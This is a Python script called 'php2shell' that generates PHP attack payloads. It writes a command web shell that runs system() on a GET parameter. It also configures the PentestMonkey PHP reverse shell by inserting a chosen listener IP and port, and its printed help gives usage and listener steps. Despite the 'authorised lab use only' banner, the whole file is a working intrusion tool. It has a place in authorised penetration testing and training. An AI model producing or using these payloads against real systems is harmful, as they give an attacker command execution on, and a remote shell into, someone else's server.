#!/usr/bin/env python3
"""
php2shell - payload generator (authorised lab use only).

Thin wrapper that produces lab payloads from STANDARD, PUBLIC references:
  cmd      : minimal command web shell  <?php system($_GET['cmd']); ?>
  revshell : configures the well-known PentestMonkey php-reverse-shell
             (ships with Kali at /usr/share/webshells/php/php-reverse-shell.php)
             with your LHOST/LPORT. Does NOT author a reverse shell - it fills
             in the IP/port of the public reference payload.

Use only against systems you own or are explicitly authorised to test.
"""
import argparse, re, sys, pathlib

REF = "/usr/share/webshells/php/php-reverse-shell.php"
BANNER = "<?php /* php2shell - AUTHORISED LAB USE ONLY. Target: DVWA on localhost. */ ?>\n"

def make_cmd(out):
    pathlib.Path(out).write_text(BANNER + "<?php system($_GET['cmd']); ?>\n")
    print(f"[+] cmd web shell -> {out}")
    print(f"    lab usage: http://127.0.0.1/.../{pathlib.Path(out).name}?cmd=id")

def make_revshell(lhost, lport, out):
    ref = pathlib.Path(REF)
    if not ref.exists():
        print(f"[!] Reference payload not found at {REF}")
        print("    Install Kali's 'webshells' package, or get it from:")
        print("    https://github.com/pentestmonkey/php-reverse-shell")
        sys.exit(1)
    src = ref.read_text()
    src = re.sub(r"\$ip\s*=\s*'[^']*';", f"$ip = '{lhost}';", src, count=1)
    src = re.sub(r"\$port\s*=\s*\d+;", f"$port = {lport};", src, count=1)
    pathlib.Path(out).write_text(src)
    print(f"[+] reverse shell configured -> {out}  (LHOST={lhost} LPORT={lport})")
    print(f"    start listener first: python3 ../listener/listener.py 0.0.0.0 {lport}")

def main():
    p = argparse.ArgumentParser(description="php2shell payload generator (lab use only)")
    p.add_argument("--type", choices=["cmd", "revshell"], required=True)
    p.add_argument("--lhost", default="127.0.0.1")
    p.add_argument("--lport", type=int, default=4444)
    p.add_argument("--out", required=True)
    a = p.parse_args()
    make_cmd(a.out) if a.type == "cmd" else make_revshell(a.lhost, a.lport, a.out)

if __name__ == "__main__":
    main()
